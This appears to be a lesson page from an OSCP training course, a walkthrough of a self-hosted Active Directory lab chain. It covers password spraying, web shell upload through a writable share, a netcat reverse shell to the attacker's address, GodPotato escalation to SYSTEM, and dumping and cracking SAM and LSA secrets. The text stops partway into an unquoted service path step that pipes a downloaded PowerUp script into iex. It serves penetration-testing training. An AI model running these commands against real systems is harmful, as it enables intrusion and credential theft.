
  
OSCP® Exam Prep CourseActive Directory Chains

Lesson 38 of 97

Completed

Start here8/8

Active Directory24/24

Active Directory Chains15/15

Chain 01: First ContactBuild a solid foundation for attacking Active Directory environments.Chain 02: StolenDevelop reliable credential access and lateral movement techniques.Chain 03: BleedWideExpand domain access through coordinated AD attacks and spraying.Chain 04: Inside JobLeverage pivoting to reach vulnerable services inside AD networks.Chain 05: GroupThinkPerform network pivoting and abuse misconfigured Group Policies to extend and maintain control.Chain 06: TrustfallShape misconfigurations and open services into borrowed authority.Chain 07: CrosslinkAbuse trusted access, traverse isolated networks, and escalate across hidden infrastructure.Chain 08: RicochetAbuse injectable endpoints, bypass their defense, and relay it across the domain to seize control.Chain 09: BloodhuntMap the hidden edges, and abuse what others overlook. Only the certified will be let through.Chain 10: ReplicantFollow the unseen edges, migrate into a living process, and make the controller surrender every secret.Chain 11: Cold StorageEscalate through a task, comb the host for credentials, and crack any encryption in your way.Chain 12: DelegateRun as the account left in the open, crack what the cache remembers, then delegate the rights to domain compromise.Chain 13: FailsafeDecrypt a GPP password, crack two vaults, and ride a WriteDacl edge to Domain Admin.Chain 14: Open RelayLeak a credential from SNMP, seize the Spooler for SYSTEM, then relay and reset your way to the domain.Chain 15: OverwriteHop a SQL linked server, loot LSA secrets twice, and reset an account to own the domain.

Initial Access17/17

Privilege Escalation15/15

Pivoting and Tunneling6/6

The Exam5/5

Notes and extras7/7

Lab

AD Chain_06

A domain controller and two Windows clients. Runs on your own machine. The download is sold in the shop, separate from membership, and is yours to keep.

[Get this chain](https://buymeacoffee.com/hackacademy/e/508226)[About this chain](https://hackerblueprint.com/labs#chain-06)[All chains bundle](https://buymeacoffee.com/hackacademy/e/582690)

Not startedStartedRooted

Wrote a walkthrough?

We'd love to see how you took this chain! Written up or on video, both are great. Email it to us and we'll take a look.

[Email your walkthrough](mailto:hacking.academy@protonmail.com?subject=Walkthrough%3A%20Chain%2006%3A%20Trustfall)

Tags

SMB EnumerationAD EnumerationPort ScanningPassword ReuseLDAP EnumerationWeb EnumerationADCS AbusePassword Spraying

PreviousCompletedNext: Chain 07: CrosslinkContinue

Chat  
and notesHelp[Ideas](https://discord.com/channels/1325919248954167468/1325966774881226862)

## Chain 06: Trustfall

17 steps

Close

0:00 / 1:21:39

Auto

1

Sweep the lab and scan the open ports

BackNext step

Your lab addressesDC IPCLIENT-1 IPCLIENT-2 IPYour IPLab subnet

1. 1Sweep the lab and scan the open ports_0:08_
    
    The lab gives one credential and one subnet. An SMB sweep finds four hosts, three of them in the domain and one that is not domain joined at all, and the domain hosts are written into a file. The sweep also names the domain and shows which host enforces SMB signing, which matters later.
    
    Three addresses go into the target file, and a two stage port scan runs against that file: every TCP port first, then service and script probes on the ports that answered. The second scan is what shows the web server on the second client and DNS on the controller.
    
    Kali
    
    ```
    cd AD_CHAIN_6
    ```
    
    Copy
    
    Moves into the folder for this chain.
    
    **Why**Scans, wordlists and loot of one chain stay together for the report.
    
    Kali
    
    ```
    cat starting_credentials.txt
    ```
    
    Copy
    
    Prints the credential the lab supplied.
    
    **Why**One domain user is the only way in, and reading it from the file avoids a typo in a password with a full stop.
    
    Kali
    
    ```
    ip route
    ```
    
    Copy
    
    Prints the routing table with the source address of our interface.
    
    **Why**The subnet to sweep is the one our interface sits on, and the same address is our file server and callback later.
    
    Kali
    
    ```
    netexec smb 10.0.2.0/24
    ```
    
    Copy
    
    Sweeps the subnet over SMB with no credentials.
    
    **Why**One sweep finds the domain hosts, the domain name and the signing state, and it shows which host is not domain joined.
    
    Kali (gedit)
    
    ```
    10.0.2.4
    10.0.2.7
    10.0.2.9
    ```
    
    Copy
    
    The file ips holds the three domain hosts, one address per line.
    
    **Why**The scan and every netexec run take the same list, so the three hosts are typed once.
    
    Kali
    
    ```
    nmap -p- -Pn -iL ips -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn -iL ips -sV -sC -v -oN nmap_sVsC.txt
    ```
    
    Copy
    
    Scans all TCP ports on the list, then runs the version and script probes on what answered, saving both runs.
    
    **Why**A full port sweep first means the slower probe scan only touches open ports, and -iL reads the target file.
    
    **Tip**Leave the host that is not domain joined out of the target file. It adds noise to every spray and it is not part of the domain you were asked to attack.
    
2. 2Test the credential on every service_4:24_
    
    The supplied account is valid on all three hosts over SMB, but it is not a local administrator anywhere, so the domain path has to start from a normal user. The same credential is then tried against every service that can give a session or run a command.
    
    WinRM refuses it everywhere, so a remote PowerShell session is out. RDP accepts it on the two clients but not on the controller. WMI answers on all three, which means the account can ask about the domain even where it cannot get a shell. Nothing is administrative yet, which is the honest picture at this point.
    
    Kali
    
    ```
    netexec smb ips -u sortiz -p 'Shade3729a.'
    ```
    
    Copy
    
    Tests the credential over SMB on all three hosts.
    
    **Why**Confirming the account and which hosts accept it is the base every later step stands on.
    
    Kali
    
    ```
    netexec winrm ips -u sortiz -p 'Shade3729a.'
    ```
    
    Copy
    
    Tests WinRM for the same account.
    
    **Why**WinRM would give a shell with no desktop, and its refusal tells us the account is not in the remote management group anywhere.
    
    Kali
    
    ```
    netexec rdp ips -u sortiz -p 'Shade3729a.'
    ```
    
    Copy
    
    Tests RDP for the same account.
    
    **Why**RDP is the interactive route, and it is open on the two clients, which is where the chain will continue.
    
    Kali
    
    ```
    netexec wmi ips -u sortiz -p 'Shade3729a.'
    ```
    
    Copy
    
    Tests WMI and RPC for the same account.
    
    **Why**WMI answers on a port that is open even where no shell service is, so it shows how far the credential reaches.
    
    **Tip**A valid account with no administrative right is still the start of a chain. Its value is the access it opens, not the rights it holds.
    
3. 3Collect the domain and add wordlists_6:12_
    
    With the controller reachable, the whole directory is collected in one pass and the app is started from the same compose file the course uses. While the images download, we install the wordlist package that the web fuzzing needs, because the default Kali wordlists are thin on directory names.
    
    The saved service scan is printed again to pick a web target by hand. The second client runs a web server on port 80, and a web server is the most likely place for a writable folder, so that is where the next step goes.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u sortiz -p 'Shade3729a.' --bloodhound --collection All --dns-server 10.0.2.4
    ```
    
    Copy
    
    Collects every domain object over LDAP into one zip for BloodHound.
    
    **Why**--collection All adds sessions, local administrators and ACLs, which is where the useful edges are.
    
    Kali
    
    ```
    curl -L https://ghst.ly/getbhce -o docker-compose.yml
    ```
    
    Copy
    
    Downloads the BloodHound compose file.
    
    **Why**One file pins the database, the graph and the app together, so the whole stack starts with one command.
    
    Kali
    
    ```
    docker-compose pull && docker-compose up -d
    ```
    
    Copy
    
    Pulls the images and starts the stack in the background.
    
    **Why**The stack takes a few minutes to pull, so it runs while we work on the web target.
    
    Kali
    
    ```
    apt install seclists
    ```
    
    Copy
    
    Installs the wordlist collection.
    
    **Why**The directory lists used for fuzzing are part of this package, and they are not installed on a minimal Kali image.
    
    Kali
    
    ```
    cat nmap_sVsC.txt
    ```
    
    Copy
    
    Prints the saved service and script scan.
    
    **Why**Reading the scan by hand is how we pick the web target, and it is cheaper than another scan.
    
    **Tip**Start the container pull before anything else that needs the network. It is the slowest step in the setup and it runs unattended.
    
4. 4Fuzz the web servers_6:56_
    
    The first fuzz uses a large directory list with recursion on the second client. It finds one folder, the client script folder that every install of that web server ships, and the folder answers with a directory listing refusal when opened in the browser, which says it exists but cannot be browsed.
    
    The second fuzz adds extensions and a bigger list and finds the same folder. Recursion into it finds one subfolder, and fuzzing that subfolder returns nothing, so the folder holds no content of ours. The same fuzz against the controller returns a page for every word, which means the web server answers everything with a default page and the results are noise; the last run with an even bigger list does the same and is stopped.
    
    Kali
    
    ```
    ffuf -u http://10.0.2.9/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1 -o dirs
    ```
    
    Copy
    
    Fuzzes directories on the second client with recursion one level deep.
    
    **Why**The first pass looks for any folder at all, and recursion follows what it finds so a nested path is not missed.
    
    Kali
    
    ```
    ffuf -u http://10.0.2.9/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -e asp,aspx,html -o files
    ```
    
    Copy
    
    Fuzzes the same host with extensions added and more threads.
    
    **Why**Adding extensions catches files as well as folders, which a directory list alone does not.
    
    Kali
    
    ```
    ffuf -u http://10.0.2.9/aspnet_client/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -e asp,aspx,html -o files
    ```
    
    Copy
    
    Fuzzes inside the folder the first run found.
    
    **Why**A folder that refuses listing may still hold files whose names can be guessed from a wordlist.
    
    Kali
    
    ```
    ffuf -u http://10.0.2.9/aspnet_client/system_web/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -e asp,aspx,html -o files
    ```
    
    Copy
    
    Fuzzes the subfolder inside it.
    
    **Why**The last level of the found path is worth one run before the folder is abandoned.
    
    Kali
    
    ```
    ffuf -u http://10.0.2.9/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1 -o dirs
    ```
    
    Copy
    
    Re-runs the directory fuzz on the second client, without recursion.
    
    **Why**The second pass confirms the earlier result and shows there is no second folder.
    
    Kali
    
    ```
    ffuf -u http://10.0.2.4/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1 -o dirs
    ```
    
    Copy
    
    Runs the same directory fuzz against the controller.
    
    **Why**The controller also runs a web server, so it gets the same treatment before we move on.
    
    Kali
    
    ```
    ffuf -u http://10.0.2.4/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -recursion-depth 1 -o dirs
    ```
    
    Copy
    
    Repeats the controller fuzz with a much larger wordlist.
    
    **Why**A bigger list is the usual way to tell a real hit from a catch-all page, and here every word returns the same page.
    
    **Tip**Compare the size of the response across the hits. A page size that never changes is a catch-all, and the fuzz result means nothing.
    
5. 5Check AD CS and read the user descriptions_16:48_
    
    The web fuzzing found nothing we can use, so the directory gets the next look. The certificate service query reaches the controller and finds a certificate authority, which is a target in itself, but no certificate template is published in a way we can abuse, so the certificate path is closed for this account.
    
    The user listing is where the chain turns. The description column of one account holds a password in clear, and the last password change column says that password was never set, which means the account has never been used. The RID cycle then adds the local accounts of each machine to the picture, and one of those is a local user with its own password.
    
    Kali
    
    ```
    cat starting_credentials.txt
    ```
    
    Copy
    
    Prints the supplied credential.
    
    **Why**The certificate query needs the account in user@domain form, so both halves are copied from the file.
    
    Kali
    
    ```
    netexec smb 10.0.2.9
    ```
    
    Copy
    
    Probes the second client over SMB.
    
    **Why**A quick confirmation that the host is still up and that the domain name resolves as expected.
    
    Kali
    
    ```
    certipy-ad find -u sortiz@hack-academy.local -p 'Shade3729a.' -dc-ip $target -vulnerable -stdout
    ```
    
    Copy
    
    Asks the certificate authority for every vulnerable template.
    
    **Why**If a template allows enrolment with a dangerous extended key usage, a certificate becomes a way to another account.
    
    Kali
    
    ```
    netexec smb 10.0.2.4 -u sortiz -p 'Shade3729a.' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users
    ```
    
    Copy
    
    Asks the controller for the user list and keeps only the names, saving them to a file.
    
    **Why**The name column is what a spray needs, and the file is reused for every later spray.
    
    Kali
    
    ```
    netexec smb ips -u sortiz -p 'Shade3729a.' --users
    ```
    
    Copy
    
    Prints the full user table, including the description and last password change columns.
    
    **Why**The descriptions are written by administrators and often hold a password or a hint, which is exactly the case here.
    
    Kali
    
    ```
    netexec smb ips -u sortiz -p 'Shade3729a.' --rid-brute | grep -i SidTypeUser
    ```
    
    Copy
    
    Cycles the relative identifiers of each host and keeps only the user objects.
    
    **Why**Local accounts are not in the user table, and one of them may be a second way in per machine.
    
    Kali
    
    ```
    netexec smb 10.0.2.4 -u sortiz -p 'Shade3729a.' --users
    ```
    
    Copy
    
    Prints the controller's user table again on its own.
    
    **Why**Reading the table from the controller only removes the per host banners and makes the descriptions readable.
    
    **Tip**Always print the user table with the description column. A password in a description is a finding you cannot get from a hash, and it needs no cracking.
    
6. 6Take the account whose password must change_22:12_
    
    The password from the description is correct, and the answer is not a failure: the controller replies that the password must change. That status is the useful one, because it proves the password is right while refusing a normal logon. Changing one character gives a plain logon failure instead, which confirms the difference between the two answers.
    
    The account cannot be used as it is, so we change the password ourselves. The old password is accepted as the current one and the new password is set, and from then on the account logs on normally on all three hosts. The password file gets both known passwords so the same spray works for every account.
    
    Kali
    
    ```
    netexec smb ips -u websvc -p 'ChangeMe123!'
    ```
    
    Copy
    
    Tries the password from the description against the web service account.
    
    **Why**The answer distinguishes a wrong password from one that is right but must be changed, and this one is the second.
    
    Kali
    
    ```
    netexec smb ips -u websvc -p 'ChangeMe123!asdsa'
    ```
    
    Copy
    
    Tries a deliberately wrong variant of the same password.
    
    **Why**A wrong password answers with a plain logon failure, which proves the earlier answer was about the account state and not a typo.
    
    Kali
    
    ```
    cat notes
    ```
    
    Copy
    
    Prints the notes file with the findings so far.
    
    **Why**The password from the description is written down before it is changed, because the report needs where it came from.
    
    Kali
    
    ```
    gedit pass
    ```
    
    Copy
    
    Opens the password file for editing.
    
    **Why**Both known passwords go into one file, and every spray below reads that file.
    
    Kali
    
    ```
    netexec smb ips -u users -p 'ChangeMe123!' --continue-on-success | fgrep '[+]'
    ```
    
    Copy
    
    Sprays the description password against every account and keeps only the successful lines.
    
    **Why**No success is expected here, and the empty result proves the password belongs to one account only.
    
    Kali
    
    ```
    netexec smb ips -u users -p 'ChangeMe123!' --continue-on-success | fgrep -vi 'LOGON_FAILURE'
    ```
    
    Copy
    
    Runs the same spray and keeps every line that is not a plain logon failure.
    
    **Why**Filtering on the failure line instead of the success line is what exposes the must change status.
    
    Kali
    
    ```
    netexec smb ips -u websvc -p 'ChangeMe123!'
    ```
    
    Copy
    
    Tests the account on its own again.
    
    **Why**One clean result is easier to read than a spray, and it confirms the account is the only one in that state.
    
    Kali
    
    ```
    smbpasswd -r 10.0.2.4 -U websvc
    ```
    
    Copy
    
    Changes the account password over SMB, giving the old password and then the new one.
    
    **Why**The account cannot be used until the password is changed, and the tool changes it in the same protocol the account will be used with.
    
    Kali
    
    ```
    netexec smb ips -u websvc -p 'ChangeMe123!!'
    ```
    
    Copy
    
    Tests the account with the new password.
    
    **Why**A valid line without the must change status is the proof that the account is now usable everywhere.
    
    **Tip**A must change answer is a valid password. Note it, then change the password with a tool that speaks the protocol, rather than assuming the account is unusable.
    
7. 7Spray both passwords and map the services_26:36_
    
    With two working passwords in the file, the spray gets its answer at once: both accounts are valid on all three hosts and neither is an administrator. That is the shape of the chain from here on, a set of ordinary credentials that have to be turned into access.
    
    WinRM refuses every pair. The output is saved to a file because the warning lines make the terminal unreadable, the failures are filtered out of the file to confirm there is no hit, and the file is deleted. RDP and WMI give the same two pairs, and the controller does not answer on RDP at all. The new account is then tried on the certificate service as well, and it sees the same authority with no usable template.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success | grep -vi STATUS_LOGON_FAILURE
    ```
    
    Copy
    
    Sprays every account with both passwords over SMB and keeps only the successful lines.
    
    **Why**Two valid pairs with no Pwn3d is the map of what the credentials can do, and it is what the rest of the chain works from.
    
    Kali
    
    ```
    netexec winrm ips -u users -p pass --continue-on-success | tee winrm
    ```
    
    Copy
    
    Sprays the same list over WinRM and saves the whole output to a file.
    
    **Why**The warning lines from the protocol library drown the results in the terminal, so the run is written to a file to be filtered.
    
    Kali
    
    ```
    cat winrm | fgrep '[-]'
    ```
    
    Copy
    
    Prints only the failure lines from the saved file.
    
    **Why**If the file holds failures and nothing else, the protocol refuses every pair and no shell is available.
    
    Kali
    
    ```
    rm winrm
    ```
    
    Copy
    
    Deletes the saved spray output file.
    
    **Why**The result is recorded in the notes, and a temporary output file left behind only clutters the folder.
    
    Kali
    
    ```
    netexec rdp ips -u users -p pass --continue-on-success | grep -vi LOGON_FAILURE
    ```
    
    Copy
    
    Sprays over RDP and keeps every line that is not a plain logon failure.
    
    **Why**RDP is the interactive route, and two clients answer while the controller does not.
    
    Kali
    
    ```
    netexec wmi ips -u users -p pass --continue-on-success | grep -vi RPC_S_ACCESS_DENIED
    ```
    
    Copy
    
    Sprays over WMI and drops the access denied lines.
    
    **Why**WMI shows how far the credentials reach on a port that is open even where no shell service listens.
    
    Kali
    
    ```
    certipy-ad find -u websvc@hack-academy.local -p 'ChangeMe123!!' -dc-ip 10.0.2.4 -vulnerable -stdout
    ```
    
    Copy
    
    Asks the certificate authority for vulnerable templates as the new account.
    
    **Why**Every account may see a different set of templates, so the query is repeated with the second credential.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success | grep -vi RPC_S_ACCESS_DENIED
    ```
    
    Copy
    
    Runs the full spray again and filters the RPC access denied lines.
    
    **Why**A different filter on the same spray shows hits that the first filter could hide.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success | grep -vi STATUS_LOGON_FAILURE
    ```
    
    Copy
    
    Runs the same spray and filters the plain logon failures.
    
    **Why**The two filters together give a list of hits and status lines with nothing else in it.
    
    **Tip**Save noisy spray output to a file and filter the file. Reading the same result through a pipe twice costs nothing and keeps the terminal usable.
    
8. 8Find the writable web root_32:48_
    
    The share listing tells the two accounts apart. The supplied account can read the default shares on each host but nothing else. The web service account can write to one share on the second client, the folder that the web server publishes, and that is the difference the whole chain turns on: a writable web root lets us put a file where the server will run it.
    
    The spider then lists what is already published, so a file we add does not overwrite something the site needs, and the browser confirms the same folder is served by the web server on port 80.
    
    Kali
    
    ```
    netexec smb ips -u sortiz -p 'Shade3729a.' --shares
    ```
    
    Copy
    
    Lists the shares on all three hosts as the supplied account.
    
    **Why**The default shares are the baseline; anything else on the list is worth a look.
    
    Kali
    
    ```
    netexec smb ips -u websvc -p 'ChangeMe123!!' --shares
    ```
    
    Copy
    
    Lists the shares as the web service account.
    
    **Why**The second account has different group memberships, and the share permissions are where that shows up.
    
    Kali
    
    ```
    netexec smb ips -u websvc -p 'ChangeMe123!!' --shares --spider Web --regex .
    ```
    
    Copy
    
    Walks the contents of the web share and prints every file it finds.
    
    **Why**Knowing what the web server already publishes means a file we add can be named without a collision.
    
    **Tip**Share permissions and file permissions are different layers. A share can say write and the folder can still refuse the write, so confirm with a test file before uploading anything that matters.
    
9. 9Upload a web shell through the share_36:40_
    
    The writable share is enough to place a file, so the client connects to it directly. The share list confirms the name, and the tree command shows the folder holds a handful of items, which is what the spider said. A small command shell is downloaded from a public collection of web shells and put into the share.
    
    The first shell loads as a form but its page answers with a forbidden error, which points at the script language rather than at the file. The second shell is written in the newer language that the server runs, and it asks for an authorisation key that the source shows. The key plus a command runs anything we type as the web server account.
    
    Kali
    
    ```
    impacket-smbclient hack-academy.local/websvc:'ChangeMe123!!'@10.0.2.9
    ```
    
    Copy
    
    Opens an SMB client session to the second client as the web service account.
    
    **Why**A raw SMB session gives us put and get against the share, which is all we need to place a file.
    
    Kali (smbclient)
    
    ```
    shares
    ```
    
    Copy
    
    Lists the shares of the host.
    
    **Why**The listing confirms the name and the access of the share before we change into it.
    
    Kali (smbclient)
    
    ```
    use web
    tree
    ```
    
    Copy
    
    Changes into the web share and prints its contents as a tree.
    
    **Why**Knowing the layout means the file we add lands at the web root and not in a subfolder.
    
    Kali
    
    ```
    wget https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/asp/cmd.aspx
    ```
    
    Copy
    
    Downloads the first web shell from a public collection.
    
    **Why**The public collections keep working shells for both server languages, and one download is faster than writing one.
    
    Kali (smbclient)
    
    ```
    put cmd.aspx
    ls
    ```
    
    Copy
    
    Uploads the shell into the web share and lists the folder.
    
    **Why**The upload is the delivery: the file is now where the web server reads from, and the listing confirms the size.
    
    Kali
    
    ```
    wget https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/aspx/asp.net-backdoors/cmdexec.aspx
    ```
    
    Copy
    
    Downloads a second web shell, written for the newer server language.
    
    **Why**The first shell was refused by the server, so the language of the script is the thing to change.
    
    Kali (smbclient)
    
    ```
    put cmdexec.aspx
    ls
    ```
    
    Copy
    
    Uploads the second shell into the same folder and lists it.
    
    **Why**The second file goes next to the first, and the listing shows both are present.
    
    **Tip**Match the shell to the server language. A file that is refused with a forbidden error is usually the wrong language for that application pool.
    
10. 10Catch a shell as the web account_40:24_
    
    The web shell is a command box, so the easiest next step is a reverse shell. A netcat binary is copied into our folder, the web server publishes that folder, and a line editing listener waits on a high port.
    
    In the shell form the first command is `powershell.exe -c "wget YOUR_IP/nc.exe -o c:\windows\tasks\nc.exe"`, which pulls the binary into the writable tasks folder. The next one, `powershell.exe -c "ls c:\windows\tasks\nc.exe"`, confirms the size, and the third, `c:\windows\tasks\nc.exe -e powershell.exe YOUR_IP 443`, starts the connection back to us. The listener catches it a second later, and the identity check names the application pool account of the web server, which is the account every web request runs as.
    
    Kali
    
    ```
    cp /usr/share/windows-binaries/nc.exe .
    ```
    
    Copy
    
    Copies the netcat binary into the current folder.
    
    **Why**The binary has to be somewhere the web server can fetch it, and the current folder is what our file server will publish.
    
    Kali
    
    ```
    ip a
    ```
    
    Copy
    
    Prints our interfaces and addresses.
    
    **Why**The reverse shell has to call back to an address the target can reach, so the lab address is confirmed first.
    
    Kali
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Serves the current folder over HTTP on port 80.
    
    **Why**One command publishes the netcat binary, and the target downloads it with the same web client it already has.
    
    Kali
    
    ```
    rlwrap nc -lvnp 443
    ```
    
    Copy
    
    Starts a listener on port 443 with line editing.
    
    **Why**The listener must be up before the shell runs, and line editing keeps an interactive session usable.
    
    CLIENT-2 (IIS shell)
    
    ```
    whoami
    ```
    
    Copy
    
    Prints the identity of the reverse shell.
    
    **Why**The answer is the application pool account, which is the lowest privileged account the web server can run as.
    
    **Tip**In the web shell, run the shell program with the netcat binary rather than a bare command prompt. PowerShell gives a much better interactive session and it is already on the host.
    
11. 11Use the token privilege to reach SYSTEM_41:56_
    
    The web account is not powerful, but the token check shows one privilege that decides the next move: the account may impersonate a client after authentication. That privilege belongs to service accounts, and any tool that can borrow the token of a system process can turn it into the highest account on the machine. No patch is needed, and the account is not an administrator.
    
    The tool that does this is a single executable, downloaded straight from its release page into the tasks folder. A first run with a trivial command prints the identity it obtained, and the answer is the system account. A second run with a group command adds our web account to the local administrators, which is the access to keep.
    
    CLIENT-2 (IIS shell)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the groups and privileges of the web account.
    
    **Why**The privilege list is what decides the escalation, and the impersonation privilege is the one that matters here.
    
    CLIENT-2 (IIS shell)
    
    ```
    hostname
    ```
    
    Copy
    
    Prints the host name of the machine.
    
    **Why**The name is used in the report and in the notes, and it confirms which machine this shell is on.
    
    CLIENT-2 (IIS shell)
    
    ```
    cd c:\windows\tasks
    ```
    
    Copy
    
    Changes to the tasks folder.
    
    **Why**The folder is writable by every user, so the tool can be dropped here without any administrative right.
    
    CLIENT-2 (IIS shell)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the folder and shows the netcat binary from the previous step.
    
    **Why**A quick check that the working folder is the one where our tools already are.
    
    CLIENT-2 (IIS shell)
    
    ```
    wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -o GodPotato.exe
    ```
    
    Copy
    
    Downloads the token tool from its release page into the tasks folder.
    
    **Why**The tool has no dependencies and needs no installation, which is why it works from a bare web shell.
    
    CLIENT-2 (IIS shell)
    
    ```
    .\GodPotato.exe -cmd "whoami"
    ```
    
    Copy
    
    Runs the tool with a trivial command and prints the identity it used.
    
    **Why**The answer is the system account, which proves the privilege can be turned into the highest token on the host.
    
    CLIENT-2 (IIS shell)
    
    ```
    .\GodPotato.exe -cmd "net localgroup administrators websvc /add"
    ```
    
    Copy
    
    Runs the tool again to add the web account to the local administrators.
    
    **Why**A group membership gives the account administrative rights on the host without depending on the payload again.
    
    **Tip**The impersonation privilege is common on web and service accounts. Check it before you look for a kernel exploit, because the token route needs no patch at all.
    
12. 12Dump the secrets and clean the host_49:24_
    
    With the group membership in place, the same credential now answers as an administrator on the second client. Three stores are read in a row: the local account hashes, the LSA secrets with the cached domain logons, and a module that looks for credentials in the logon process, which finds nothing extra here. One cached logon belongs to an account we have not seen, and its hash goes into a file for the cracker.
    
    Before the crack finishes, the machine is put back. The web account is removed from the local administrators, the local dump confirms the administrative answer is gone, and our tools are deleted from the tasks folder. The netcat binary cannot be removed from the shell we are in, so it is deleted through the web shell instead, which runs as the web account and owns the file.
    
    John cracks the cached hash in a few seconds, and the password is added to the list.
    
    Kali
    
    ```
    netexec smb ips -u websvc -p 'ChangeMe123!!' --sam
    ```
    
    Copy
    
    Dumps the local SAM hashes from the host.
    
    **Why**Local hashes matter on other machines that reuse a local administrator password, and they are part of the report.
    
    Kali
    
    ```
    netexec smb ips -u websvc -p 'ChangeMe123!!' --lsa
    ```
    
    Copy
    
    Dumps the LSA secrets from the host.
    
    **Why**The cached domain logons are in this store, and one of them is a domain password we have not seen.
    
    Kali
    
    ```
    netexec smb ips -u websvc -p 'ChangeMe123!!' -M lsassy
    ```
    
    Copy
    
    Runs a module that looks for credentials in the logon process memory.
    
    **Why**It is worth one run before the machine is cleaned, because it sometimes finds plain text that the registry stores do not.
    
    Kali
    
    ```
    gedit client_2_hash
    ```
    
    Copy
    
    Opens a file to hold the cached hash.
    
    **Why**The cracker takes a file in its own format, so the cached line is pasted into a file of its own.
    
    CLIENT-2 (IIS shell)
    
    ```
    .\GodPotato.exe -cmd "net localgroup administrators websvc /del"
    ```
    
    Copy
    
    Uses the token tool to remove the web account from the local administrators.
    
    **Why**The group was our access; removing it now means the host is not left with an administrative account we added.
    
    Kali
    
    ```
    netexec smb ips -u websvc -p 'ChangeMe123!!'
    ```
    
    Copy
    
    Checks the web account again.
    
    **Why**The answer is valid without Pwn3d, which confirms the administrative right is gone.
    
    CLIENT-2 (IIS shell)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the tools left in the working folder.
    
    **Why**Before deleting, we see exactly what was dropped on the host.
    
    CLIENT-2 (IIS shell)
    
    ```
    rm *
    ```
    
    Copy
    
    Deletes every file in the working folder.
    
    **Why**The tools are no longer needed, and removing them is part of leaving the machine as we found it.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt client_2_hash
    ```
    
    Copy
    
    Attacks the cached hash with the wordlist.
    
    **Why**A cached logon hash cracks offline, and the wordlist covers the pattern this password follows.
    
    Kali
    
    ```
    gedit pass
    ```
    
    Copy
    
    Opens the password file to add the cracked password.
    
    **Why**The new password joins the list, and the next spray tests it against every account.
    
    **Tip**Clean as you go, not at the end. Removing the group membership and the tools while the shell is open is easy; coming back later to do it is not.
    
13. 13Pivot to the first client as the new user_54:00_
    
    The cracked password is valid on all three hosts and administrative nowhere, so it is another ordinary identity. The protocol sweep is what makes it useful: over RDP the account answers with an administrative result on the first client, which means it can open a desktop there and the session will be an administrator session.
    
    The certificate service is queried once more with this account and still finds no usable template. The desktop client is installed, we connect to the first client, and the token check in the new session shows a plain user with a remote desktop membership. Administrative over the network is not the same as administrative in the session, which is worth seeing before the next step.
    
    Kali
    
    ```
    netexec smb ips -u vlang -p 'Shar4334!'
    ```
    
    Copy
    
    Tests the new account over SMB on all three hosts.
    
    **Why**A valid password on every host is the base, and the absence of Pwn3d says it is not a local administrator yet.
    
    Kali
    
    ```
    netexec wmi ips -u vlang -p 'Shar4334!'
    ```
    
    Copy
    
    Tests the account over WMI.
    
    **Why**WMI shows the account can reach the remote registry and service interfaces even without a shell.
    
    Kali
    
    ```
    netexec winrm ips -u vlang -p 'Shar4334!'
    ```
    
    Copy
    
    Tests the account over WinRM.
    
    **Why**WinRM is refused on both hosts, so a remote PowerShell session is not the way in.
    
    Kali
    
    ```
    netexec rdp ips -u vlang -p 'Shar4334!'
    ```
    
    Copy
    
    Tests the account over RDP.
    
    **Why**The first client answers with Pwn3d, which means an interactive session there carries administrative rights.
    
    Kali
    
    ```
    certipy-ad find -u vlang@hack-academy.local -p 'Shar4334!' -dc-ip 10.0.2.4 -vulnerable -stdout
    ```
    
    Copy
    
    Repeats the certificate template query with the new account.
    
    **Why**Each account may see different templates, and this account also finds nothing usable.
    
    Kali
    
    ```
    apt install remmina
    ```
    
    Copy
    
    Installs the desktop client.
    
    **Why**The RDP client is not installed on every Kali image, and the package manager confirms it is already present.
    
    CLIENT-1 (RDP)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the groups and privileges of the desktop session.
    
    **Why**The token shows a remote desktop membership and no administrative group, which explains why the network said Pwn3d.
    
    **Tip**An administrative result over RDP does not always mean an administrative token in the session. Check the token before you plan an escalation that needs one.
    
14. 14Test the unquoted service path_59:00_
    
    On the first client the workflow is the same as before: change to the writable tasks folder, pull the privilege check from our collection, and read what it reports. This time it reports something usable: a service whose binary path is not quoted and contains spaces, which means the loader walks up the path and tries each folder with a space in it.
    
    The obvious test is the program folder itself, and it fails: our user may read it but not write, and the binary is owned by the administrators. The service cannot be stopped or started by us either. The folder that holds the service, however, is a different object: its permissions give the users group modify rights, which means we can create the file the loader looks for before it reaches the real one.
    
    CLIENT-1 (PowerShell)
    
    ```
    cd c:\windows\tasks
    ```
    
    Copy
    
    Changes to the tasks folder.
    
    **Why**Every tool we drop lives here, and the folder is writable by ordinary users.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the folder before the checks run.
    
    **Why**It confirms the staging folder is empty and writable before anything is executed from it.
    
    CLIENT-1 (PowerShell)
    
    ```
    powershell.exe -c "wget -useb https://raw.githubusercontent.com/punishell/ADCheatSheet/refs/heads/master/PowerUp.ps1 | iex; Invoke-AllChecks"
    ```
    
    Copy
    
    Downloads the privilege check and runs every check.
    
